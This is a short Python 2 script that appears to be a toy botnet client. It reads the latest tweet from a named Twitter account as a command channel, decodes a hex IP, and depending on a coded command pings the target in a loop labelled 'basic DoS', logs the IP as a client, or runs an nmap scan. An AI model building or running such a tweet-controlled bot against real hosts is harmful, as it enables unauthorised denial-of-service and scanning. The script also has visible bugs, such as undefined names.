#Social Client
import os
from libnmap.process import NmapProcess
from time import sleep
from scrapetwit import* # Author - ThePythonDjango.Com with minor tweaks for this script

#return the last tweet
def getLastTweet():
    try:
        file = open(filename,"r")
    except IOError:
        print "Could not read file:", fname
        sys.exit()

    with file:
        twitText = file.read()
        file.close()

    startTweets = twitText.find("[")
    endTweets = twitText.find("]")


    justTweets = twitText[startTweets+1:endTweets] #extract tweet text
    lastTweet = justTweets.split(",",1)[0] #return last tweet only
    return lastTweet.replace('"','') #strip quotations

#convert IP code from hex to decimal IPV4 format
def decodeIP(IPcode):
    oct1 = str(int(IPcode[0:2],16))
    oct2 = str(int(IPcode[2:4],16))
    oct3 = str(int(IPcode[4:6],16))
    oct4 = str(int(IPcode[6:8],16))

    return oct1+"."+oct2+"."+oct3+"."+oct4


#Begin code
taccount = "Rick58992217" #set Twitter account name
#start(taccount) #use the scrapetwit script to access the specified twitter account

filename = taccount+"_twitter.json" #set filename that contains scraped tweets

tweetComm = getLastTweet()

label, command, IPcode = tweetComm.split("|", 3)

IPaddr = decodeIP(IPcode)

#flood IP with pings - basic DoS
if command == "ds7656":
    print "ping "+IPaddr
    os.system("ping -c 10 " + IPaddr)
#add client to list 
elif command == "ac73456":
    print "add client " + IPaddr
    file = open("clientList.txt","a")
    file.write(IPaddr)
    file.close()
#scan IP    
elif command == "sc26769":
    print "scan " + IPaddr
    nmap_proc = NmapProcess(targets="scanme.nmap.org", options="-sT")
    nmap_proc.run_background()
    while nmap_proc.is_running():
        print("Nmap Scan running: ETC: {0} DONE: {1}%".format(nmap_proc.etc,nmap_proc.progress))
        sleep(2)
    print("rc: {0} output: {1}".format(nmap_proc.rc, nmap_proc.summary))

else:
    print "No valid command found"
